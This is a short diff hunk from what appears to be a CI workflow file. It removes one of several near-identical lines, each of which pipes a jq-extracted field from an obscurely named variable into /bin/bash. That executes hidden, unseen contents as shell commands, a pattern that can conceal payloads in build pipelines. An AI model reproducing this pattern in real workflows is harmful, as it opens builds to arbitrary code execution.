@@ -55,7 +55,6 @@ jobs:
           printf '%s' "$vv1503" | jq -r .j6402 | /bin/bash
           echo $q8608 | jq -r .drgla75 | /bin/bash
           printf '%s' "$kdk74" | jq -r .gkvnw4 | /bin/bash
-          echo $ptgo41 | jq -r .fyrtg971 | /bin/bash
           printf '%s' "$a34958" | jq -r .qe0 | /bin/bash
           echo $jizg80 | jq -r .nvj9070 | /bin/bash
           echo $k2044 | jq -r .t35059 | /bin/bash
